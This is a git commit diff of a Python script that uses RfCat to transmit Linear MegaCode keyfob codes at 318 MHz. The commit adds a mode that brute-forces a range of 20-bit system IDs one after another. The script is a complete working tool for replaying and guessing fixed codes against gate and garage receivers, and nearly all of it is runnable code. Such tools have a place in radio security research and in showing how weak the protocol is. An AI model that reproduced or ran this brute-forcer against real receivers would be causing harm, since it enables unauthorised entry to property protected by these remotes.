5924c92dea923ac1da8385355b0226ccab7c6d7f
rjmendez <robertjmendez@gmail.com>
2017-11-19 19:30:27 -0600

    Adding the ability to brute force a range of IDs.

--- Linear_keyfob.py
+++ Linear_keyfob.py
@@ -1,106 +1,6 @@
 #!/usr/bin/env python
 #11/18/2017 rjmendez
-import binascii, bitstring, sys, getopt, rflib, time
-
-#Help
-help_msg = 'Nothing Yet'
-
-#Radio stuff
-frequency = 318000000
-baudRate = 1000
-keyLen = 0
-
-def ConfigureD(d):
-    d.setMdmModulation(rflib.MOD_ASK_OOK)
-    d.setFreq(frequency)
-    d.makePktFLEN(keyLen)
-    d.setMdmDRate(baudRate)
-    d.setMaxPower()
-    d.lowball()
-#Padding the input values.
-def PadBytes(byte_length, hex_val):
-    #print(str(byte_length-len(hex_val)))
-    pad_num = byte_length-len(hex_val)
-    if pad_num >= 1:
-        pad_str = "0" * pad_num
-        #print(pad_str)
-        padded_hex_val = str(pad_str + hex_val)
-        #print(padded_hex_val)
-        return padded_hex_val
-    if pad_num == 0:
-        #do nothing
-        padded_hex_val = hex_val
-        return padded_hex_val
-    if pad_num < 0:
-        print('Invalid length of input, was expecting <= ' + str(byte_length) + ' but we got ' + str(len(hex_val)) + ' instead!')
-        print(help_msg)
-        quit()
-
-def PacketValues(sysid):
-    hex_sysid = PadBytes(6, str(hex(sysid)).lstrip("0x"))
-    input_hex = hex_sysid
-    return input_hex
-
-def ValidateInputs(sysid):
-    if sysid >= 1048576:
-        print("Invalid System ID Detected!")
-        print(help_msg)
-        quit()
-    if sysid <= 1048575:
-        return sysid
-
-#Bytes to Bits ascii stream.
-def byte_to_binary(n):
-    return ''.join(str((n & (1 << i)) and 1) for i in reversed(range(8)))
-#Hex to Bytes.
-def hex_to_binary(h):
-    return ''.join(byte_to_binary(ord(b)) for b in binascii.unhexlify(h))
-
-def main(argv):
-    data = 1
-    rxid = ''
-    sysid = ''
-    input_hex = ''
-    output_hex = ''
-    output_bin = ''
-    try:
-        opts, args = getopt.getopt(argv,"hs:",["systemid"])
-    except getopt.GetoptError as error:
-        print(error)
-        print(help_msg)
-        sys.exit(2)
-    for opt, arg in opts:
-        if opt == '-h':
-            print(help_msg)
-            sys.exit()
-        elif opt in ("-s", "--systemid"):
-            sysid = int(arg)
-    if len(sys.argv) == 1:
-        print('Invalid input, program accepts the following input format:\n' + help_msg)
-        sys.exit(2)
-
-
-    sysid = ValidateInputs(sysid)
-    #Generate packet hex
-    input_hex = PacketValues(sysid)
-    
-    #Convert hex to binary ascii stream
-    input_bin = hex_to_binary(input_hex)
-    input_bin = input_bin[4:] #Removing extra null byte
-    #print(input_bin)
-    
-    #Convert binary data to format that the radio is expecting. 1 = 00001 0 = 001000
-    for bit in input_bin:
-        if bit == '0':
-            output_bin += '001000'
-        elif bit == '1':
-            output_bin += '000001'
-        else:
-            print("lolwut?")
-    
-#    rf_data = bitstring.BitArray(bin=output_bin+data_spoiler).tobytes()
-
-    '''
+'''
 Reading the Linear protocol documentation describes a 6ms 25 bit-frame with individual 1ms symbols 
 
   sync      1      2      3      4      5      6      7      8      9     10     11     12     13     14     15     16     17     18     19     20     21     22     23
@@ -124,24 +24,195 @@ Documentation describes frame 0 as the sync frame, 1-20 as system code, and 21-2
 
 10101010001010100110 010
 AA2A6 2
-    '''
+'''
+import binascii, bitstring, sys, getopt, rflib, time
 
+#Help
+help_msg = '\nLinear Technologies MegaCode RfCat transmitter.\n\nUse this to transmit a single remote ID or iterate through a range.\nIDs are 20 bits and are provided as an integer between 1 and 1048575.\n    -s, --systemid    <integer between 1-1048575>\n    -l, --lower       <lower end of range>\n    -u, --upper       <upper end of range>\n\n'
+
+#Radio stuff
+frequency = 318000000
+baudRate = 1000
+keyLen = 0
+
+def ConfigureD(d):
+    d.setMdmModulation(rflib.MOD_ASK_OOK)
+    d.setFreq(frequency)
+    d.makePktFLEN(keyLen)
+    d.setMdmDRate(baudRate)
+    d.setMaxPower()
+    d.lowball()
+#Padding the input values.
+def PadBytes(byte_length, hex_val):
+    pad_num = byte_length-len(hex_val)
+    if pad_num >= 1:
+        pad_str = "0" * pad_num
+        padded_hex_val = str(pad_str + hex_val)
+        return padded_hex_val
+    if pad_num == 0:
+        #do nothing
+        padded_hex_val = hex_val
+        return padded_hex_val
+    if pad_num < 0:
+        print('Invalid length of input, was expecting <= ' + str(byte_length) + ' but we got ' + str(len(hex_val)) + ' instead!')
+        print(help_msg)
+        quit()
+
+def PacketValues(sysid):
+    input_hex = PadBytes(6, str(hex(sysid)).lstrip("0x"))    
+    return input_hex
+
+def ValidateInput_sysid_single(sysid):
+    if sysid >= 1048576:
+        print("Invalid System ID Detected!")
+        print(help_msg)
+        quit()
+    if sysid <= 1048575:
+        return sysid
+
+def ValidateInput_sysid_lower(sysid_lower, sysid_upper):
+    if sysid_upper <= sysid_lower:
+        print("Invalid Range Detected!\nUpper value must be greater than lower value!")
+        print(help_msg)
+        quit()
+    if sysid_upper >= 1048576:
+        print("Invalid System ID Detected!")
+        print(help_msg)
+        quit()
+    if sysid_lower >= 1:
+        return sysid_lower
+
+
+def ValidateInput_sysid_upper(sysid_lower, sysid_upper):
+    if sysid_upper <= sysid_lower:
+        print("Invalid Range Detected!\nUpper value must be greater than lower value!")
+        print(help_msg)
+        quit()
+    if sysid_upper >= 1048576:
+        print("Invalid System ID Detected!")
+        print(help_msg)
+        quit()
+    if sysid_upper <= 1048575:
+        return sysid_upper
+
+#Bytes to Bits ascii stream.
+def byte_to_binary(n):
+    return ''.join(str((n & (1 << i)) and 1) for i in reversed(range(8)))
+#Hex to Bytes.
+def hex_to_binary(h):
+    return ''.join(byte_to_binary(ord(b)) for b in binascii.unhexlify(h))
+
+def FormatBitFrame(input_bin):
+    output_bin = ''
+    for bit in input_bin:
+        if bit == '0':
+            output_bin += '001000'
+        elif bit == '1':
+            output_bin += '000001'
+        else:
+            print("lolwut?")
+    return output_bin
+
+def TransmitData(output_bin, input_hex, d):
     sync_frame = "000001"
-    data_frame = "001000000001001000" #2
+    data_frame = "001000000001001000" #value = 2
     null_tail  = "000000"
     rf_data = bitstring.BitArray(bin=sync_frame+output_bin+data_frame+null_tail).tobytes()
     keyLen = len(rf_data)
-    #Configure Radio here.
-    d = rflib.RfCat()
-    ConfigureD(d)
     #Transmit here.
-    print('Sending packet payload 4*: ' + input_hex + '2')
-    d.RFxmit(rf_data, repeat=3)
-    time.sleep(1)
-    d.setModeIDLE()
-    print('Done!')
-    quit()
+    print('Sending packet payload: ' + input_hex + '2' + ' System ID: ' + str(int(input_hex, 16)))
+    d.RFxmit(rf_data)
+    print('-'*40)
 
+
+def main(argv):
+    data = 1
+    rxid = ''
+    sysid = ''
+    sysid_lower = False
+    sysid_upper = False
+    sysid_range = False
+    sysid_single = False
+    input_hex = ''
+    output_hex = ''
+    
+    try:
+        opts, args = getopt.getopt(argv,"hl:u:s:",["lower=","upper=","systemid"])
+    except getopt.GetoptError as error:
+        print(error)
+        print(help_msg)
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt == '-h':
+            print(help_msg)
+            sys.exit()
+        elif opt in ("-l", "--lower"):
+            sysid_lower = int(arg)
+            sysid_single = False
+        elif opt in ("-u", "--upper"):
+            sysid_upper = int(arg)
+            sysid_single = False
+        elif opt in ("-s", "--systemid"):
+            sysid = int(arg)
+            sysid_range = False
+            sysid_single = True
+
+    if len(sys.argv) == 1:
+        print('Invalid input, program accepts the following input format:\n' + help_msg)
+        sys.exit(2)
+
+    if (sysid_lower or sysid_upper) and sysid:
+        print('Invalid input, cannot accept range AND single System ID!')
+    if sysid_lower and sysid_upper:
+        print('Generating System ID ' + str(sysid_lower) + ' through ' + str(sysid_upper))
+        sysid_range = True
+        sysid_single = False
+    if not (sysid_lower and sysid_upper) and sysid:
+        print('Sending single System ID ' + str(sysid))
+        sysid_range = False
+
+    if sysid_single:
+        sysid = ValidateInput_sysid_single(sysid)
+        #Generate packet hex
+        input_hex = PacketValues(sysid)
+        #Convert hex to binary ascii stream
+        input_bin = hex_to_binary(input_hex)
+        input_bin = input_bin[4:] #Removing extra null byte
+        output_bin = FormatBitFrame(input_bin)
+        #print('Configuring RfCat...')
+        d = rflib.RfCat()
+        d.setModeIDLE()
+        #print('Configuring Radio...')
+        ConfigureD(d)
+        TransmitData(output_bin, input_hex, d)
+        time.sleep(0.01)
+        d.setModeIDLE()
+        print('Done!')
+        quit()
+
+    if sysid_range:
+        sysid_lower = ValidateInput_sysid_lower(sysid_lower, sysid_upper)
+        sysid_upper = ValidateInput_sysid_upper(sysid_lower, sysid_upper)
+        #print('Configuring RfCat...')
+        d = rflib.RfCat()
+        d.setModeIDLE()
+        #print('Configuring Radio...')
+        ConfigureD(d)
+        for i in range(sysid_lower, sysid_upper+1, 1):
+            #Generate packet hex
+            input_hex = PacketValues(i)
+            #Convert hex to binary ascii stream
+            input_bin = hex_to_binary(input_hex)
+            input_bin = input_bin[4:] #Removing extra null byte
+            output_bin = FormatBitFrame(input_bin)
+            TransmitData(output_bin, input_hex, d)
+            time.sleep(0.005)
+        d.setModeIDLE()
+        print('Done!')
+        quit()
+    if not sysid_range or sysid_single:
+        print('Incomplete parameters specified!')
+        print(help_msg)
 
 if __name__ == "__main__":
     main(sys.argv[1:])
